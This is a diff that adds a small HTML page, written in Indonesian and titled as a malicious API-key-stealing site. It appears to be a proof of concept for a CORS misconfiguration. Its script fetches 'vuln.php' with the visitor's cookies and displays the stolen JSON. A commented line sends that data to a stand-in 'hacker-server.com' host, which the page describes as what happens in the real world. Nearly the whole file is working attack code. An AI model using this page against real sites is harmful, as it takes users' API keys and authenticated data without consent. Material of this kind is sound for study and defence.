@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Website Jahat Pencuri API Key</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        #stolen-data { white-space: pre-wrap; word-wrap: break-word; color: #ff0; }
+    </style>
+</head>
+<body>
+    <h1>Tunggu sebentar... (Mencuri API Key di background)</h1>
+    <p>Karena target memiliki CORS Misconfiguration, kita bisa membaca response datanya dari domain lain (file ini).</p>
+    
+    <h3>Data yang dicuri:</h3>
+    <div id="stolen-data">Mengeksekusi Fetch API...</div>
+
+    <script>
+        // Memaksa request dengan credentials (cookies) jika target mengizinkan
+        fetch('vuln.php', {
+            method: 'GET',
+            credentials: 'include' 
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('stolen-data').innerText = JSON.stringify(data, null, 4);
+            // Di dunia nyata, data ini akan dikirim otomatis ke server hacker
+            // fetch('https://hacker-server.com/log?data=' + encodeURIComponent(JSON.stringify(data)));
+        })
+        .catch(err => {
+            document.getElementById('stolen-data').innerText = "Gagal mencuri. Apakah API sedang mati?";
+        });
+    </script>
+</body>
+</html>
